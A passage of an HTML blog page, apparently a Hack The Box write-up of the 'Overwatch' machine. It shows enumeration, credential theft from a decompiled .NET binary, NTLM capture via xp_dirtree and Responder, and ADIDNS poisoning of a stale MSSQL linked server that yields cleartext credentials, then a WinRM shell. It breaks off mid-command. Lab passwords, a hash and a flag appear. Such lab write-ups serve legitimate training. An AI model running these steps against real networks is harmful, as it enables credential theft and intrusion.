@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Era Labs | Overwatch</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+     
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Space+Grotesk:wght@500;600&amp;display=swap');
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: linear-gradient(135deg, #1a1333, #2a1f5f, #1a1333);
+            background-size: 400% 400%;
+            animation: kawaiiGradient 25s ease infinite;
+        }
+        @keyframes kawaiiGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .logo-font { font-family: 'Space Grotesk', sans-serif; }
+        .neon-pink { text-shadow: 0 0 15px #ec4899, 0 0 30px #ec4899; }
+        .neon-cyan { text-shadow: 0 0 15px #67e8f9, 0 0 30px #67e8f9; }
+
+        .prose {
+            color: #f1f5f9;
+            max-width: 100%;
+        }
+        .prose p, .prose li, .prose td {
+            font-size: 1.15rem;
+            line-height: 1.85;
+            color: #f1f5f9;
+        }
+
+        .prose h1 {
+            font-size: 3.2rem;
+            color: #f1f5f9;
+            font-weight: 700;
+            text-shadow: 0 0 30px #ec4899, 0 0 50px #ec4899;
+            font-family: 'Space Grotesk', sans-serif;
+            margin-top: 2.5rem;
+            margin-bottom: 1.25rem;
+        }
+        .prose h2, .prose h3, .prose h4, .prose h5, .prose h6 {
+            color: #f1f5f9;
+            font-weight: 600;
+            text-shadow: none;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+        .prose h2 { font-size: 2.6rem; margin-top: 3rem; margin-bottom: 1rem; }
+        .prose h3 { font-size: 2.1rem; margin-top: 2.75rem; margin-bottom: 0.75rem; }
+        .prose h4, .prose h5, .prose h6 { font-size: 1.75rem; margin-top: 2.5rem; margin-bottom: 0.75rem; }
+
+        .prose ul, .prose ol {
+            list-style: none;
+            padding-left: 0;
+        }
+        .prose ul li, .prose ol li {
+            position: relative;
+            padding-left: 2rem;
+            margin-bottom: 0.75rem;
+        }
+        .prose ul li::before, .prose ol li::before {
+            content: "♦";
+            position: absolute;
+            left: 0;
+            color: #ec4899;
+            font-size: 1.4rem;
+        }
+        .prose ul ul, .prose ol ul,
+        .prose ul ol, .prose ol ol {
+            padding-left: 3rem;
+        }
+        .prose ul ul ul, .prose ol ul ul {
+            padding-left: 4rem;
+        }
+
+        .prose pre {
+            background: rgb(24 24 27 / 0.7);
+            padding: 1.75rem;
+            border-radius: 20px;
+            overflow-x: auto;
+            border: 1px solid #ec4899;
+            box-shadow: 0 0 25px -10px #ec4899;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-top: 2.5rem;
+            margin-bottom: 2.5rem;
+        }
+        .prose code {
+            font-family: ui-monospace, monospace;
+            color: #67e8f9;
+        }
+
+        .prose a {
+            color: #67e8f9;
+            text-decoration: underline;
+            text-underline-offset: 4px;
+        }
+        .prose a:hover { color: #ec4899; }
+
+        .prose img {
+            max-width: 100%;
+            border-radius: 20px;
+            margin: 2.5rem 0;
+            border: 1px solid #ec4899;
+        }
+
+        .prose blockquote {
+            border-left: 6px solid #ec4899;
+            padding-left: 1.5rem;
+            color: #f1f5f9;
+            background: #27272a;
+            border-radius: 0 12px 12px 0;
+            padding: 1.25rem;
+        }
+    </style>
+</head>
+<body class="text-zinc-100">
+    <nav class="fixed top-0 left-0 right-0 bg-zinc-900/90 backdrop-blur-xl border-b border-zinc-800 z-50">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+            <a href="../index.html" class="flex items-center gap-3">
+                <div>
+                    <span class="logo-font text-3xl font-bold tracking-tighter neon-pink">CYBER ERA</span>
+                    <span class="logo-font text-3xl font-bold tracking-tighter neon-white">LABS</span>
+                </div>
+            </a>
+            <div class="hidden md:flex items-center gap-8 text-sm font-medium">
+                <a href="../index.html" class="hover:text-pink-400 transition-colors">HOME</a>
+                <a href="./" class="text-pink-400 transition-colors">HACKTHEBOX</a>
+                <a href="../blueteam/" class="hover:text-pink-400 transition-colors">BLUE TEAM &amp; SHERLOCKS</a>
+                <a href="../threatintel/" class="hover:text-pink-400 transition-colors">THREAT INTEL</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="max-w-7xl mx-auto px-6 pt-28 pb-12">
+        <a href="./" class="text-pink-400 hover:text-pink-500 mb-8 inline-flex items-center gap-2 text-sm font-medium">
+            ← Back to HackTheBox Library
+        </a>
+       
+        <div class="flex items-center gap-4 text-xs text-zinc-400 mb-6">
+            <span class="px-4 py-1 bg-pink-900 text-pink-300 rounded-3xl font-mono tracking-widest">HACKTHEBOX</span>
+        </div>
+
+        <div class="prose">
+            <h1 class="text-5xl font-bold logo-font tracking-tighter neon-pink mb-6">Overwatch</h1>
+            <h2>Summary</h2>
+<p>Overwatch is a Windows-based Active Directory machine from Hack The Box, featuring a realistic enterprise environment with services like DNS, Kerberos, LDAP, SMB, and MSSQL exposed. It runs a non-standard MSSQL instance on port 6520 and hosts a .NET monitoring application that leaks hardcoded credentials. The machine relies on a WCF service on port 8000, which is vulnerable to command injection. Key exploitation paths involve SMB enumeration, ADIDNS poisoning, and abuse of linked servers for credential capture.</p>
+<h2>Initial Enumeration</h2>
+<h3>Nmap Scan</h3>
+<pre><code>└─$ nmap -sC -sV 10.129.53.197 -p- -oA nmap/overwatch
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-08 17:47 UTC
+Nmap scan report for 10.129.244.81
+Host is up (0.050s latency).
+Not shown: 65509 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-08 17:54:46Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=S200401.overwatch.htb
+| Not valid before: 2026-05-07T17:46:18
+|_Not valid after:  2026-11-06T17:46:18
+| rdp-ntlm-info: 
+|   Target_Name: OVERWATCH
+|   NetBIOS_Domain_Name: OVERWATCH
+|   NetBIOS_Computer_Name: S200401
+|   DNS_Domain_Name: overwatch.htb
+|   DNS_Computer_Name: S200401.overwatch.htb
+|   DNS_Tree_Name: overwatch.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-05-08T17:55:41+00:00
+|_ssl-date: 2026-05-08T17:56:21+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
+|_ssl-date: 2026-05-08T17:56:21+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-05-08T17:48:32
+|_Not valid after:  2056-05-08T17:48:32
+| ms-sql-info: 
+|   10.129.244.81:6520: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 6520
+| ms-sql-ntlm-info: 
+|   10.129.244.81:6520: 
+|     Target_Name: OVERWATCH
+|     NetBIOS_Domain_Name: OVERWATCH
+|     NetBIOS_Computer_Name: S200401
+|     DNS_Domain_Name: overwatch.htb
+|     DNS_Computer_Name: S200401.overwatch.htb
+|     DNS_Tree_Name: overwatch.htb
+|_    Product_Version: 10.0.20348
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+53566/tcp open  tcpwrapped
+53580/tcp open  tcpwrapped
+53695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+53696/tcp open  msrpc         Microsoft Windows RPC
+53702/tcp open  msrpc         Microsoft Windows RPC
+58743/tcp open  tcpwrapped
+58745/tcp open  tcpwrapped
+58760/tcp open  tcpwrapped
+58780/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-05-08T17:55:42
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 514.66 seconds
+</code></pre>
+<p>Lets add S200401.overwatch.htb to our hosts file along side with the domain name overwatch.htb</p>
+<pre><code>└─$ cat /etc/hosts                         
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.53.197  S200401.overwatch.htb overwatch.htb
+</code></pre>
+<h3>Initial Enumeration</h3>
+<p>From the output of Nmap, we can see several open ports that are worth enumerating:</p>
+<ul>
+<li>53 DNS</li>
+<li>88 Kerberos</li>
+<li>135 RPC</li>
+<li>389 LDAP</li>
+<li>445 (SMB</li>
+</ul>
+<p>When approaching a domain, one of the most effective ways to gather intelligence is by using BloodHound. Collecting data for ingestion into BloodHound allows for visualization of relationships and potential attack paths within the Active Directory environment.</p>
+<pre><code>└─$ bloodhound-python  -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -d overwatch.htb -c all --zip -ns 10.129.53.197
+</code></pre>
+<p>Now we can enumerate the other ports. Let's continue with SMB. </p>
+<p>Listing the shares using smbclient with anonymous access:</p>
+<pre><code>└─$ smbclient -N -L \\10.129.53.197\
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        software$       Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.244.81 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+<p>Retrieving the files located at software$.</p>
+<pre><code>└─$ smbclient -N '\\10.129.53.197\software$'
+
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DH        0  Sat May 17 01:27:07 2025
+  ..                                DHS        0  Thu Jan  1 06:46:47 2026
+  Monitoring                         DH        0  Sat May 17 01:32:43 2025
+
+                7147007 blocks of size 4096. 966668 blocks available
+smb: \&gt; cd Monitoring
+smb: \Monitoring\&gt; ls
+  .                                  DH        0  Sat May 17 01:32:43 2025
+  ..                                 DH        0  Sat May 17 01:27:07 2025
+  EntityFramework.dll                AH  4991352  Thu Apr 16 20:38:42 2020
+  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 20:38:56 2020
+  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 20:38:56 2020
+  EntityFramework.xml                AH  3738289  Thu Apr 16 20:38:40 2020
+  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 14:46:10 2017
+  overwatch.exe                      AH     9728  Sat May 17 01:19:24 2025
+  overwatch.exe.config               AH     2163  Sat May 17 01:02:30 2025
+  overwatch.pdb                      AH    30208  Sat May 17 01:19:24 2025
+  System.Data.SQLite.dll             AH   450232  Sun Sep 29 20:41:18 2024
+  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 20:40:06 2024
+  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 20:40:42 2024
+  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 18:48:00 2024
+  System.Management.Automation.dll     AH   360448  Mon Jul 17 14:46:10 2017
+  System.Management.Automation.xml     AH  7145771  Mon Jul 17 14:46:10 2017
+  x64                                DH        0  Sat May 17 01:32:33 2025
+  x86                                DH        0  Sat May 17 01:32:33 2025
+
+                7147007 blocks of size 4096. 966550 blocks available
+smb: \Monitoring\&gt; 
+</code></pre>
+<pre><code>smb: \Monitoring\&gt; mget *.*
+Get file EntityFramework.dll? y
+getting file \Monitoring\EntityFramework.dll of size 4991352 as EntityFramework.dll (5727.8 KiloBytes/sec) (average 5727.8 KiloBytes/sec)
+Get file EntityFramework.SqlServer.dll? y
+getting file \Monitoring\EntityFramework.SqlServer.dll of size 591752 as EntityFramework.SqlServer.dll (3073.8 KiloBytes/sec) (average 5247.6 KiloBytes/sec)
+Get file EntityFramework.SqlServer.xml? y
+getting file \Monitoring\EntityFramework.SqlServer.xml of size 163193 as EntityFramework.SqlServer.xml (1122.3 KiloBytes/sec) (average 4751.6 KiloBytes/sec)
+Get file EntityFramework.xml? y
+getting file \Monitoring\EntityFramework.xml of size 3738289 as EntityFramework.xml (6450.0 KiloBytes/sec) (average 5301.8 KiloBytes/sec)
+Get file Microsoft.Management.Infrastructure.dll? y
+getting file \Monitoring\Microsoft.Management.Infrastructure.dll of size 36864 as Microsoft.Management.Infrastructure.dll (253.5 KiloBytes/sec) (average 4922.3 KiloBytes/sec)
+Get file overwatch.exe? y
+getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (70.9 KiloBytes/sec) (average 4601.0 KiloBytes/sec)
+Get file overwatch.exe.config? y
+getting file \Monitoring\overwatch.exe.config of size 2163 as overwatch.exe.config (16.8 KiloBytes/sec) (average 4332.2 KiloBytes/sec)
+Get file overwatch.pdb? y
+getting file \Monitoring\overwatch.pdb of size 30208 as overwatch.pdb (226.9 KiloBytes/sec) (average 4098.0 KiloBytes/sec)
+Get file System.Data.SQLite.dll? y
+getting file \Monitoring\System.Data.SQLite.dll of size 450232 as System.Data.SQLite.dll (2338.7 KiloBytes/sec) (average 3964.0 KiloBytes/sec)
+Get file System.Data.SQLite.EF6.dll? y
+getting file \Monitoring\System.Data.SQLite.EF6.dll of size 206520 as System.Data.SQLite.EF6.dll (1420.3 KiloBytes/sec) (average 3825.5 KiloBytes/sec)
+Get file System.Data.SQLite.Linq.dll? y
+getting file \Monitoring\System.Data.SQLite.Linq.dll of size 206520 as System.Data.SQLite.Linq.dll (988.6 KiloBytes/sec) (average 3619.8 KiloBytes/sec)
+Get file System.Data.SQLite.xml? y
+getting file \Monitoring\System.Data.SQLite.xml of size 1245480 as System.Data.SQLite.xml (4313.1 KiloBytes/sec) (average 3683.0 KiloBytes/sec)
+Get file System.Management.Automation.dll? y
+getting file \Monitoring\System.Management.Automation.dll of size 360448 as System.Management.Automation.dll (2146.3 KiloBytes/sec) (average 3605.6 KiloBytes/sec)
+Get file System.Management.Automation.xml? y
+getting file \Monitoring\System.Management.Automation.xml of size 7145771 as System.Management.Automation.xml (6225.1 KiloBytes/sec) (average 4276.0 KiloBytes/sec)
+smb: \Monitoring\&gt; 
+</code></pre>
+<p>Let's inspect the <code>.exe</code> file.</p>
+<p>From the output:</p>
+<pre><code>└─$ file overwatch.exe
+
+overwatch.exe: PE32+ executable for MS Windows 6.00 (console), x86-64 Mono/.Net assembly, 2 sections
+</code></pre>
+<p>We can confirm it's a 64-bit .NET executable.  Since it's a .NET binary, we can decompile it to reconstruct readable source code. </p>
+<p>Using ILSpy, a popular open-source .NET decompiler, we can load <code>overwatch.exe</code> and analyze its structure.</p>
+<pre><code>└─$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip 
+</code></pre>
+<pre><code>┌──(kali㉿kali)-[~/ILSpy/artifacts/linux-x64]
+└─$ ./ILSpy 
+</code></pre>
+<p>After reviewing the file for some minutes, hardcoded credentials are found.</p>
+                <div class="w-full h-full object-cover">  
+                    <img 
+                        src="images/Pasted image 20260508222454.png" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Pirate"
+                   >
+                </div>
+                <div class="w-full h-full object-cover">  
+                    <img 
+                        src="images/Pasted image 20260508222547.png]" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Pirate"
+                   >
+                </div>
+<p>Now we can test the credentials (<code>sqlsvc:TI0LKcfHzZw1Vv</code>) against the available services: SMB, WINRM, and MSSQL.</p>
+<pre><code>└─$ nxc smb 10.129.53.197 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'           
+SMB         10.129.53.197   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.53.197   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+
+┌──(kali㉿kali)-[~/LABS/Overwatch]
+└─$ nxc smb 10.129.53.197 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --shares
+SMB         10.129.53.197   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.53.197   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+SMB         10.129.53.197   445    S200401          [*] Enumerated shares
+SMB         10.129.53.197   445    S200401          Share           Permissions     Remark
+SMB         10.129.53.197   445    S200401          -----           -----------     ------
+SMB         10.129.53.197   445    S200401          ADMIN$                          Remote Admin
+SMB         10.129.53.197   445    S200401          C$                              Default share
+SMB         10.129.53.197   445    S200401          IPC$            READ            Remote IPC
+SMB         10.129.53.197   445    S200401          NETLOGON        READ            Logon server share 
+SMB         10.129.53.197   445    S200401          software$       READ            
+SMB         10.129.53.197   445    S200401          SYSVOL          READ            Logon server share 
+</code></pre>
+<pre><code>└─$ nxc mssql 10.129.53.197 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --port 6520 
+MSSQL       10.129.244.81   6520   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
+MSSQL       10.129.244.81   6520   S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+</code></pre>
+<h3>MSSQL ENUMERATION</h3>
+<p>We will access the MSSQL service with impacket and enumerate our user and our permissions, and the user that we can impersonate.</p>
+<pre><code>└─$ impacket-mssqlclient -port 6520 sqlsvc@10.129.53.197 -windows-auth                                                                                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (OVERWATCH\sqlsvc  guest@master)&gt; 
+</code></pre>
+<h4>Verifying our Current User and Role</h4>
+<pre><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-----------   
+OVERWATCH\sqlsvc   
+          0   
+</code></pre>
+<p>From the output above we see that the flag is set to 0, so the user isn't an Admin.</p>
+<h4>Identify Users that We Can Impersonate</h4>
+<pre><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+name   
+----   
+</code></pre>
+<h4>Stealing the Hash of the MSSQL Service Account</h4>
+<p>We can try steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server. We need first top start Responder.</p>
+<pre><code>└─$ sudo responder -I tun0  
+</code></pre>
+<p>Then we execute xp_dirtree on the MSSQL service.</p>
+<pre><code>└─$ sudo responder -I tun0 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+&lt;SNIP&gt;                                                               
+
+[SMB] NTLMv2-SSP Client   : 10.129.53.197
+[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
+[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:76b1363bfb2a35cd:D471879E07DFC075153E922783DF687E:010100000000000000381235EADFDC0113896EABDFE6BE250000000002000800530030004300490001001E00570049004E002D004600350031005700480056004100350035005100590004003400570049004E002D00460035003100570048005600410035003500510059002E0053003000430049002E004C004F00430041004C000300140053003000430049002E004C004F00430041004C000500140053003000430049002E004C004F00430041004C000700080000381235EADFDC0106000400020000000800300030000000000000000000000000300000A8D9B9F6841896C9C429590C57F1A77D65015B0A23DBC967359CAAE60F9C1F860A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100310034000000000000000000  
+</code></pre>
+<p>The username end with a dollar so it is probably a machine account or a group manager service account. So it will be a complety random password and the hash usuallly is not crackable.</p>
+<p>The username ends with a dollar sign $, indicating it is likely a machine account r a group manager service account. These accounts typically have randomly generated, complex passwords that are not human-managed. As a result, the password is usually strong and the NTLM hash is practically uncrackable using conventional methods like brute-force or rainbow tables.</p>
+<h4>Identify linked Servers in MSSQL</h4>
+<p>Listing MSSQL linked servers.</p>
+<pre><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; SELECT srvname, isremote FROM sysservers
+srvname              isremote   
+------------------   --------   
+S200401\SQLEXPRESS          1   
+SQL07                       0   
+</code></pre>
+<p>From the output above we see that <code>SQL07</code> is a linked server.</p>
+<p>Sending a pass through communication to see if we can reach the linked server from the instance that we are now.</p>
+<pre><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [SQL07]
+
+
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider &quot;MSOLEDBSQL&quot; for linked server &quot;SQL07&quot; returned message &quot;Login timeout expired&quot;.
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider &quot;MSOLEDBSQL&quot; for linked server &quot;SQL07&quot; returned message &quot;A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.&quot;.
+ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64]. 
+</code></pre>
+<p>Even though we have a linked server configured, we cannot establish a connection to it. This suggests that the target server, SQL07, is either offline or does not exist. </p>
+<p>Searching for SQL07 in BloodHound yields no results, confirming it's not a known host in the domain—likely a stale or non-existent entry.</p>
+                <div class="w-full h-full object-cover">  
+                    <img 
+                        src="images/Pasted image 20260509215626.png" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Pirate"
+                   >
+                </div>
+<p>So that is a dead link on this server that dosent exist anymore.</p>
+<p>Lets check if there is any mappings of the instance SQL07</p>
+<pre><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; EXEC sp_helplinkedsrvlogin;
+Linked Server   Local Login   Is Self Mapping   Remote Login   
+-------------   -----------   ---------------   ------------  
+</code></pre>
+<p>The output from sp_helplinkedsrvlogin shows no login mappings, which aligns with the earlier connection failure. This indicates the DNS record for SQL07 has likely been removed.</p>
+<p>Since we have a service account sqlsvc, we can exploit this by creating our own DNS record for SQL07.overwatch.htb, pointing it to our attacker machine. This allows us to intercept authentication attempts when the linked server is queried—enabling relay or credential capture attacks.</p>
+<pre><code>└─$ bloodyAD -u sqlsvc -p TI0LKcfHzZw1Vv --host overwatch.htb add dnsRecord SQL07 10.10.15.114
+[+] SQL07 has been successfully added
+</code></pre>
+<p>Now lets try again to execute a command on the remote server and get the hash of the service account that is running on the linked server.</p>
+<pre><code>SQL (OVERWATCH\sqlsvc  guest@master)&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(sysadmin)') AT [SQL07]
+
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider &quot;MSOLEDBSQL&quot; for linked server &quot;SQL07&quot; returned message &quot;Communication link failure&quot;.
+ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
+</code></pre>
+<p>Even if we get an error going back to Responder we see that we grabbed the password of the user.</p>
+<pre><code>└─$ sudo responder -I tun0                                                                            
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+&lt;SNIP&gt;                                                             
+
+[MSSQL] Cleartext Client   : 10.129.53.197
+[MSSQL] Cleartext Hostname : SQL07 ()
+[MSSQL] Cleartext Username : sqlmgmt
+[MSSQL] Cleartext Password : bIhBbzMMnB82yx
+</code></pre>
+<h5>Testing credentials</h5>
+<pre><code>└─$ nxc smb 10.129.53.197 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx' 
+SMB         10.129.53.197   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.53.197   445    S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx 
+</code></pre>
+<pre><code>└─$ nxc winrm 10.129.53.197 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx' 
+WINRM       10.129.53.197   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.53.197   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
+
+</code></pre>
+<h3>Internal Enumeration</h3>
+<p>After confirming access via WinRM, we log in using <code>evil-winrm</code> with the <code>sqlmgmt</code> credentials and retrieve the user flag.</p>
+<pre><code>└─$ evil-winrm -u sqlmgmt -p bIhBbzMMnB82yx -i 10.129.53.197
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; Get-ChildItem -Path C:\ -Name user.txt -Recurse -ErrorAction SilentlyContinu
+Users\sqlmgmt\Desktop\user.txt
+
+
+
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; type C:\Users\sqlmgmt\Desktop\user.txt
+b310ccfa401d8e59704d4d57718c93d3
+</code></pre>
+<p>After some enumeration and revisiting the XML configuration files we downloaded, we discover a service running on port 8000. </p>
+<p>In the overwatch.exe.config file, we find the following entry.</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;configuration&gt;
+  &lt;configSections&gt;
+    &lt;!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 --&gt;
+    &lt;section name=&quot;entityFramework&quot; type=&quot;System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot; requirePermission=&quot;false&quot; /&gt;
+  &lt;/configSections&gt;
+  &lt;system.serviceModel&gt;
+    &lt;services&gt;
+      &lt;service name=&quot;MonitoringService&quot;&gt;
+        &lt;host&gt;
+          &lt;baseAddresses&gt;
+            &lt;add baseAddress=&quot;http://overwatch.htb:8000/MonitorService&quot; /&gt;
+          &lt;/baseAddresses&gt;
+        &lt;/host&gt;
+        &lt;endpoint address=&quot;&quot; binding=&quot;basicHttpBinding&quot; contract=&quot;IMonitoringService&quot; /&gt;
+        &lt;endpoint address=&quot;mex&quot; binding=&quot;mexHttpBinding&quot; contract=&quot;IMetadataExchange&quot; /&gt;
+      &lt;/service&gt;
+    &lt;/services&gt;
+    &lt;behaviors&gt;
+      &lt;serviceBehaviors&gt;
+        &lt;behavior&gt;
+          &lt;serviceMetadata httpGetEnabled=&quot;True&quot; /&gt;
+          &lt;serviceDebug includeExceptionDetailInFaults=&quot;True&quot; /&gt;
+        &lt;/behavior&gt;
+      &lt;/serviceBehaviors&gt;
+    &lt;/behaviors&gt;
+  &lt;/system.serviceModel&gt;
+  &lt;entityFramework&gt;
+    &lt;providers&gt;
+
+&lt;SNIP&gt;
+</code></pre>
+<p>A monitoring service is running on port 8000.</p>
+<p>Let’s investigate what is hosting.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; curl -UseBasicParsing http://overwatch.htb:8000/MonitorService
+
+
